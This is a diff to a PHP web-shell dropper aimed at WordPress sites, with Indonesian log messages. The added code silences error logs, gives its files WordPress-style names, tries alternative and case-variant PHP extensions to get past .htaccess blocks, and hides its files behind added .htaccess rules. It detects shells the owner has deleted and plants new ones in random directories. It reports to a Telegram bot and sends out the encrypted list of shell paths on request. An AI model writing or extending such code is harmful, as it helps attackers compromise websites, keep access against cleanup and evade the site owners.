@@ -1,4 +1,16 @@
 <?php
+@ini_set('display_errors', 0);
+@ini_set('log_errors', 0);
+@error_reporting(0);
+
+if (!isset($_GET['TnemaL']) || $_GET['TnemaL'] != '1') {
+    @ini_set('display_errors', 0);
+}
+
+define('ABSPATH', __DIR__ . '/');
+define('WP_USE_THEMES', false);
+define('SHORTINIT', true);
+
 $showOutput = isset($_GET['TnemaL']) && $_GET['TnemaL'] == '1';
 
 if ($showOutput) {
@@ -160,7 +172,7 @@ function sendTelegramDocument($botToken, $chatId, $filePath, $caption) {
 function shouldNotify($cooldown) {
     $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
     $safeDomain = preg_replace('/[^a-z0-9]/', '_', strtolower($domain));
-    $lastNotifyFile = __DIR__ . '/.last_notify_' . $safeDomain;
+    $lastNotifyFile = __DIR__ . '/.wp_' . substr(md5($safeDomain), 0, 12) . '_transient';
     
     $forceNotify = isset($_GET['notify']) && $_GET['notify'] == '1';
     
@@ -260,6 +272,83 @@ if (file_exists($pathFileHtaccess)) {
     }
 }
 
+function detectAllowedExtension($dir) {
+    $htaccessFile = $dir . DIRECTORY_SEPARATOR . '.htaccess';
+    
+    $possibleExtensions = [
+        '.PHP',   // Uppercase
+        '.Php',   // Capitalized
+        '.PhP',   // Mixed
+        '.pHp',   // Mixed
+        '.php',   // Lowercase (default)
+        '.inc',   // Include files
+        '.phar',  // PHP Archive
+        '.php7',  // PHP 7
+        '.php8'   // PHP 8
+    ];
+    
+    if (!file_exists($htaccessFile)) {
+        return '.php';
+    }
+    
+    $htaccessContent = @file_get_contents($htaccessFile);
+    if ($htaccessContent === false) {
+        return '.php';
+    }
+    
+    $blockedPatterns = [];
+    $allowedPatterns = [];
+    
+    if (preg_match_all('/<Files\s+["\']?\*\.([^"\'>\s]+)["\']?>/i', $htaccessContent, $matches)) {
+        foreach ($matches[0] as $index => $fullMatch) {
+            $pattern = $matches[1][$index];
+            
+            $blockStart = strpos($htaccessContent, $fullMatch);
+            $blockEnd = strpos($htaccessContent, '</Files>', $blockStart);
+            
+            if ($blockEnd !== false) {
+                $block = substr($htaccessContent, $blockStart, $blockEnd - $blockStart);
+                
+                if (stripos($block, 'Deny') !== false || stripos($block, 'Require not') !== false) {
+                    $blockedPatterns[] = strtolower($pattern);
+                } elseif (stripos($block, 'Allow') !== false || stripos($block, 'Require all granted') !== false) {
+                    $allowedPatterns[] = strtolower($pattern);
+                }
+            }
+        }
+    }
+    
+    foreach ($possibleExtensions as $ext) {
+        $extPattern = ltrim(strtolower($ext), '.');
+        
+        $isExplicitlyAllowed = false;
+        foreach ($allowedPatterns as $allowed) {
+            if (fnmatch($allowed, $extPattern)) {
+                $isExplicitlyAllowed = true;
+                break;
+            }
+        }
+        
+        if ($isExplicitlyAllowed) {
+            return $ext;
+        }
+        
+        $isBlocked = false;
+        foreach ($blockedPatterns as $blocked) {
+            if (fnmatch($blocked, $extPattern)) {
+                $isBlocked = true;
+                break;
+            }
+        }
+        
+        if (!$isBlocked) {
+            return $ext;
+        }
+    }
+    
+    return '.php';
+}
+
 function generateSmartFilename($dir, $shellMarker, &$usedFilenames) {
     $blacklist = [
         'index.php', 'config.php', 'wp-config.php', 'database.php',
@@ -351,6 +440,8 @@ function generateSmartFilename($dir, $shellMarker, &$usedFilenames) {
     $safeWords = ['legacy', 'compat', 'deprecated', 'extra', 'utils', 'tags', 'alt', 'backup', 'old', 'tmp'];
     $words = array_merge($words, $safeWords);
     
+    $allowedExt = detectAllowedExtension($dir);
+    
     $attempts = 0;
     $maxAttempts = 30;
     
@@ -358,7 +449,7 @@ function generateSmartFilename($dir, $shellMarker, &$usedFilenames) {
         shuffle($words);
         $wordCount = rand(2, min(3, count($words)));
         $selectedWords = array_slice($words, 0, $wordCount);
-        $filename = implode($separator, $selectedWords) . '.php';
+        $filename = implode($separator, $selectedWords) . $allowedExt;
         $filepath = $dir . DIRECTORY_SEPARATOR . $filename;
         
         if (in_array($filename, $blacklist)) {
@@ -395,13 +486,19 @@ function generateSmartFilename($dir, $shellMarker, &$usedFilenames) {
         $attempts++;
     }
     
-    return getUnusedFallbackName($fallbackNames, $usedFilenames);
+    return getUnusedFallbackName($fallbackNames, $usedFilenames, $dir);
 }
 
-function getUnusedFallbackName($fallbackNames, &$usedFilenames) {
-    shuffle($fallbackNames);
+function getUnusedFallbackName($fallbackNames, &$usedFilenames, $dir = null) {
+    $allowedExt = $dir ? detectAllowedExtension($dir) : '.php';
     
-    foreach ($fallbackNames as $name) {
+    $fallbackNamesWithExt = array_map(function($name) use ($allowedExt) {
+        return str_replace('.php', $allowedExt, $name);
+    }, $fallbackNames);
+    
+    shuffle($fallbackNamesWithExt);
+    
+    foreach ($fallbackNamesWithExt as $name) {
         if (!isset($usedFilenames[$name]) || $usedFilenames[$name] < 2) {
             $usedFilenames[$name] = ($usedFilenames[$name] ?? 0) + 1;
             return $name;
@@ -409,12 +506,12 @@ function getUnusedFallbackName($fallbackNames, &$usedFilenames) {
     }
     
     $timestamp = substr(md5(microtime()), 0, 6);
-    return 'class-' . $timestamp . '.php';
+    return 'class-' . $timestamp . $allowedExt;
 }
 
 function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
     $today = date('Y-m-d');
-    $uploaderCacheFile = $webRoot . DIRECTORY_SEPARATOR . '.cron_cache';
+    $uploaderCacheFile = $webRoot . DIRECTORY_SEPARATOR . '.wp_cron_' . substr(md5('uploader_cache'), 0, 8);
     $uploaderMap = [];
     
     if (file_exists($uploaderCacheFile)) {
@@ -540,6 +637,114 @@ function getAllDirs($dir) {
     return $subDirs;
 }
 
+function detectUnexpectedDeletion($webRoot, $shellMap) {
+    $deleted = [];
+    $existing = [];
+    
+    foreach ($shellMap as $subdirKey => $filename) {
+        $filepath = $webRoot . $subdirKey . DIRECTORY_SEPARATOR . $filename;
+        
+        if (file_exists($filepath)) {
+            $existing[$subdirKey] = $filename;
+        } else {
+            $deleted[$subdirKey] = $filename;
+        }
+    }
+    
+    return [
+        'deleted' => $deleted,
+        'existing' => $existing
+    ];
+}
+
+function sendTelegramAlert($deletedCount, $deletedFiles, $cacheAge) {
+    global $telegramBotToken, $telegramChatId;
+    
+    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
+    $safeDomain = str_replace('.', '', $domain);
+    
+    $hoursAgo = round($cacheAge / 3600, 1);
+    
+    $alertMessage = "🚨🚨🚨 <b>SECURITY ALERT</b> 🚨🚨🚨\n";
+    $alertMessage .= "━━━━━━━━━━━━━━━━\n\n";
+    $alertMessage .= "🌐 <b>Domain:</b> {$domain}\n";
+    $alertMessage .= "⚠️ <b>Event:</b> Unexpected File Deletion\n\n";
+    $alertMessage .= "📊 <b>Details:</b>\n";
+    $alertMessage .= "  • Files deleted: <b>{$deletedCount}</b>\n";
+    $alertMessage .= "  • Time since last update: <b>{$hoursAgo}h</b>\n";
+    $alertMessage .= "  • Expected rotation: <b>24h</b>\n\n";
+    
+    if ($deletedCount <= 10) {
+        $alertMessage .= "📝 <b>Deleted files:</b>\n";
+        foreach ($deletedFiles as $subdir => $filename) {
+            $alertMessage .= "  • <code>{$subdir}/{$filename}</code>\n";
+        }
+        $alertMessage .= "\n";
+    }
+    
+    $alertMessage .= "🎯 <b>Response:</b>\n";
+    $alertMessage .= "  ✅ Creating {$deletedCount} NEW locations\n";
+    $alertMessage .= "  ✅ Avoiding deleted paths\n";
+    $alertMessage .= "  ✅ Keeping existing shells intact\n\n";
+    
+    $alertMessage .= "💡 <b>Analysis:</b>\n";
+    if ($deletedCount < 10) {
+        $alertMessage .= "  ⚠️ Targeted deletion (owner found specific files)\n";
+    } elseif ($deletedCount < 50) {
+        $alertMessage .= "  ⚠️ Partial cleanup (owner doing manual search)\n";
+    } else {
+        $alertMessage .= "  🚨 Mass deletion (owner might know the pattern)\n";
+    }
+    
+    $alertMessage .= "\n⏰ " . date('Y-m-d H:i:s') . "\n";
+    $alertMessage .= "━━━━━━━━━━━━━━━━";
+    
+    $url = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
+    $data = [
+        'chat_id' => $telegramChatId,
+        'text' => $alertMessage,
+        'parse_mode' => 'HTML'
+    ];
+    
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    @curl_exec($ch);
+    curl_close($ch);
+    
+    echo "🚨 Security alert sent to Telegram!\n";
+}
+
+function createRandomLocations($webRoot, $count, $shellMarker, &$usedFilenames) {
+    $directories = getAllDirs($webRoot);
+    
+    $availableDirs = array_filter($directories, function($dir) use ($webRoot) {
+        $relativePath = str_replace($webRoot, '', $dir);
+        return strpos($relativePath, DIRECTORY_SEPARATOR . 'wp-admin') === false 
+            && strpos($relativePath, DIRECTORY_SEPARATOR . 'wp-includes') === false;
+    });
+    
+    if (count($availableDirs) < $count) {
+        $availableDirs = $directories;
+    }
+    
+    shuffle($availableDirs);
+    $selectedDirs = array_slice($availableDirs, 0, min($count, count($availableDirs)));
+    
+    $newLocations = [];
+    
+    foreach ($selectedDirs as $dir) {
+        $subdirKey = str_replace($webRoot, '', $dir);
+        $filename = generateSmartFilename($dir, $shellMarker, $usedFilenames);
+        $newLocations[$subdirKey] = $filename;
+    }
+    
+    return $newLocations;
+}
+
 function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
     $directories = getAllDirs($dir);
     $resultPaths = [];
@@ -548,19 +753,48 @@ function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
     echo "\nMulai upload shell ke " . count($directories) . " direktori...\n";
     
     $today = date('Y-m-d');
-    $cacheFile = $dir . DIRECTORY_SEPARATOR . '.system_cache';
+    $cacheFile = $dir . DIRECTORY_SEPARATOR . '.wp_cache_' . substr(md5('shell_locations'), 0, 8);
     $shellMap = [];
     
     protectCacheFile($cacheFile);
     
+    $cache = [];
     if (file_exists($cacheFile)) {
         $encryptedData = file_get_contents($cacheFile);
         $cache = decryptCache($encryptedData);
+    }
+    
+    $cacheTimestamp = $cache['timestamp'] ?? 0;
+    $cacheAge = time() - $cacheTimestamp;
+    $shellMap = $cache['shells'] ?? [];
+    
+    if (!empty($shellMap) && isset($cache['date']) && $cache['date'] === $today) {
+        echo "Menggunakan nama file dari cache hari ini ($today)\n";
         
-        if (isset($cache['date']) && $cache['date'] === $today) {
-            $shellMap = $cache['shells'] ?? [];
-            echo "Menggunakan nama file dari cache hari ini ($today)\n";
-        } else {
+        $status = detectUnexpectedDeletion($dir, $shellMap);
+        $deletedCount = count($status['deleted']);
+        $existingCount = count($status['existing']);
+        
+        if ($deletedCount > 0 && $cacheAge < 82800) {
+            echo "\n🚨 ADAPTIVE MODE ACTIVATED!\n";
+            echo "Detected {$deletedCount} unexpected deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
+            
+            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge);
+            
+            $newLocations = createRandomLocations($dir, $deletedCount, $shellMarker, $usedFilenames);
+            
+            $shellMap = array_merge($status['existing'], $newLocations);
+            
+            echo "🎯 RESPONSE: Created {$deletedCount} NEW random locations\n";
+            echo "✅ Kept {$existingCount} existing shells\n";
+            echo "📊 Total active shells: " . count($shellMap) . "\n\n";
+            
+        } elseif ($deletedCount > 0 && $cacheAge >= 82800) {
+            echo "✅ Normal 24h rotation detected ({$deletedCount} files)\n";
+        }
+        
+    } else {
+        if (!empty($cache)) {
             echo "Cache expired (tanggal berbeda), generate nama baru\n";
             if (isset($cache['success_rate']) && $cache['success_rate'] < 0.8) {
                 echo "⚠️ Success rate rendah kemarin (" . ($cache['success_rate']*100) . "%), KEEP old shells sebagai backup\n";
@@ -569,6 +803,7 @@ function uploadFilesToAllDirs($dir, $shellContent, $shellMarker) {
                 cleanupOldShells($dir, $cache['shells'] ?? []);
             }
         }
+        $shellMap = [];
     }
     
     $isNewDay = empty($shellMap);
@@ -632,19 +867,25 @@ function protectCacheFile($cacheFile) {
     
     $htaccessRules = "
 # Protect system cache files
-<Files \".system_cache\">
+<Files \".wp_cache_*\">
     Order Allow,Deny
     Deny from all
 </Files>
 
 # Protect cron cache files
-<Files \".cron_cache\">
+<Files \".wp_cron_*\">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+# Protect transient files
+<Files \".wp_*_transient\">
     Order Allow,Deny
     Deny from all
 </Files>
 
 # Protect database backup
-<Files \"db.txt\">
+<Files \"db.md\">
     Order Allow,Deny
     Deny from all
 </Files>
@@ -671,7 +912,7 @@ function protectCacheFile($cacheFile) {
         
         if (is_writable($htaccessFile)) {
             $content = @file_get_contents($htaccessFile);
-            if ($content !== false && strpos($content, '.system_cache') === false) {
+            if ($content !== false && strpos($content, '.wp_cache_') === false) {
                 if (@file_put_contents($htaccessFile, $content . "\n" . $htaccessRules) !== false) {
                     echo "✅ .htaccess protection rules added\n";
                 } else {
@@ -693,17 +934,22 @@ function createFallbackProtection($cacheFile) {
     $rules = "# If you can access this file, move these rules to main .htaccess manually
 # Or change .htaccess ownership to allow PHP to write
 
-<Files \".system_cache\">
+<Files \".wp_cache_*\">
     Order Allow,Deny
     Deny from all
 </Files>
 
-<Files \".cron_cache\">
+<Files \".wp_cron_*\">
     Order Allow,Deny
     Deny from all
 </Files>
 
-<Files \"db.txt\">
+<Files \".wp_*_transient\">
+    Order Allow,Deny
+    Deny from all
+</Files>
+
+<Files \"db.md\">
     Order Allow,Deny
     Deny from all
 </Files>
@@ -743,9 +989,18 @@ function cleanupOldShells($baseDir, $oldShellMap) {
 }
 
 function writeResultToFile($resultPaths, $outputFile) {
-    $content = implode("\n", $resultPaths);
-    file_put_contents($outputFile, $content);
-    echo "Hasil telah ditulis ke $outputFile\n";
+    $data = [
+        'date' => date('Y-m-d H:i:s'),
+        'results' => $resultPaths,
+        'total' => count($resultPaths),
+        'success' => count(array_filter($resultPaths, fn($l) => strpos($l, 'SUCCESS') !== false)),
+        'failed' => count(array_filter($resultPaths, fn($l) => strpos($l, 'FAILED') !== false))
+    ];
+    
+    $encrypted = encryptCache($data);
+    file_put_contents($outputFile, $encrypted);
+    @chmod($outputFile, 0600);
+    echo "Hasil telah ditulis ke $outputFile (encrypted)\n";
 }
 
 echo "\n========================================\n";
@@ -767,7 +1022,7 @@ echo "Berhasil: $successCount file\n";
 echo "Gagal: $failedCount file\n";
 echo "========================================\n";
 
-$outputFile = $webRoot . DIRECTORY_SEPARATOR . 'db.txt';
+$outputFile = $webRoot . DIRECTORY_SEPARATOR . 'db.md';
 writeResultToFile($hasilPaths, $outputFile);
 
 echo "\n========================================\n";
@@ -809,13 +1064,13 @@ if (shouldNotify($notificationCooldown)) {
     
     $summaryMessage .= "💬 <b>Commands:</b>\n";
     $summaryMessage .= "  • <code>?notify=1</code> - Force update\n";
-    $summaryMessage .= "  • <code>?senddb=1</code> - Get db.txt\n";
+    $summaryMessage .= "  • <code>?senddb=1</code> - Get db.md\n";
     $summaryMessage .= "  • <code>?fullreport=1</code> - Full paths file\n\n";
     
     $summaryMessage .= "⏰ " . date('Y-m-d H:i:s') . "\n";
     $summaryMessage .= "━━━━━━━━━━━━━━━━";
     
-    $chatTrackFile = __DIR__ . '/.telegram_chat_master';
+    $chatTrackFile = __DIR__ . '/.wp_' . substr(md5('chat_master'), 0, 12) . '_meta';
     sendOrEditMessage($telegramBotToken, $telegramChatId, $summaryMessage, $chatTrackFile);
     echo "\n✅ Chat dashboard updated!\n";
     
@@ -943,7 +1198,7 @@ if (shouldNotify($notificationCooldown)) {
         $detailedReport .= "━━━━━━━━━━━━━━━━";
     }
     
-    $channelTrackFile = __DIR__ . '/.telegram_channel_' . $safeDomain;
+    $channelTrackFile = __DIR__ . '/.wp_' . substr(md5('channel_' . $safeDomain), 0, 12) . '_option';
     sendOrEditMessage($telegramBotToken, $telegramChannelId, $detailedReport, $channelTrackFile);
     echo "✅ Channel report updated!\n";
     
@@ -953,12 +1208,12 @@ if (shouldNotify($notificationCooldown)) {
 
 if (isset($_GET['senddb']) && $_GET['senddb'] == '1') {
     $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
-    $caption = "📄 <b>db.txt Backup</b>\n🌐 {$domain}\n⏰ " . date('Y-m-d H:i:s');
+    $caption = "📄 <b>db.md Backup</b>\n🌐 {$domain}\n⏰ " . date('Y-m-d H:i:s');
     
     if (sendTelegramDocument($telegramBotToken, $telegramChatId, $outputFile, $caption)) {
-        echo "\n✅ db.txt sent to Telegram!\n";
+        echo "\n✅ db.md sent to Telegram!\n";
     } else {
-        echo "\n❌ Failed to send db.txt\n";
+        echo "\n❌ Failed to send db.md\n";
     }
 }
 
